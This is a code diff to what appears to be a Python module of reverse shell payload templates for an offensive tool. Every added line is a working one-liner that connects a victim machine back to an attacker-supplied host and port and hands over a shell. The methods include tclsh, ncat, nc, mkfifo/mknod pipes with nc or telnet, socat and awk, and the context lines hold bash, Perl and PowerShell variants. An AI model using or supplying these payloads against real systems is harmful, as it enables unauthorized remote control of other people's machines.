@@ -14,6 +14,23 @@ REV_PERL_TCP_2 = """perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET
 
 BASH_TCP = """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
 
-#REV_POWERSHELL_TCP="""powershell -nop -ExecutionPolicy Bypass -Command ' = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = "$($sendback) PS $((pwd).Path) > ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' """
-
 REV_POWERSHELL_TCP="""powershell -nop -ep bypass -Command '$ip="TARGET";$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
+
+REVERSE_TCLSH = """echo 'set s [socket TARGET PORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"""
+
+REVERSE_NCAT = "ncat TARGET PORT -e /bin/bash"
+
+REVERSE_NC_TRADITIONAL_1 = "nc TARGET PORT -c /bin/bash"
+
+
+REVERSE_MKFIFO_NC = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/f"
+
+REVERSE_MKNOD_NC = "if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"
+
+REVERSE_MKFIFO_TELNET = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/f"
+
+REVERSE_MKNOD_TELNET = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mknod /tmp/f p && telnet TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"
+
+REVERSE_SOCAT = """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
+
+REVERSE_AWK = """awk 'BEGIN {s = "/inet/tcp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
